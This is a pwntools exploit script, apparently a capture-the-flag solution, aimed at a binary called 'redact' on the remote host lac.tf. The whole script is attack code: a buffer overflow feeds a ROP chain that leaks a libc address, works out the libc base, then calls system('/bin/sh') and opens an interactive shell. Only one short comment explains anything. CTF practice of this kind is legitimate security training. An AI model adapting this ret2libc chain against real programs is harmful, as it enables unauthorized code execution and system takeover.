#!/usr/bin/env python3


from pwn import * 

e = ELF("./redact")
libc = ELF("./libc-2.31.so")
#r = process("./redact")
r = remote("lac.tf",31281)
r.sendlineafter(b"Enter some text",b"A" * 8)       
r.sendlineafter(b"Enter a placeholder",b"A" * 72 + p64(0x401779) + p64(0x404050) + p64(0) + p64(0x40177b) + p64(0x4040c0) + p64(0x4010c0) + p64(0x401779) + p64(0x40202e) + p64(0) + p64(0x40177b) + p64(0x4040c0) + p64(0x4010c0) + p64(e.sym.main)) 
r.sendlineafter(b"Enter the index of the stuff to redact:",b"0") #leak atexit libc address and then leak a newline for buffering and return to main
r.recvline() 
libc_base = u64(r.recvuntil(b"\x7f").decode('latin-1').ljust(8,'\x00')) - 0x3b9f0
log.info("The libc leak of the process is " + hex(libc_base))
r.sendlineafter(b"Enter a placeholder",b"A" * 72 + p64(0x40177b) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system))
r.sendlineafter(b"Enter the index of the stuff to redact:",b"0")
r.interactive()
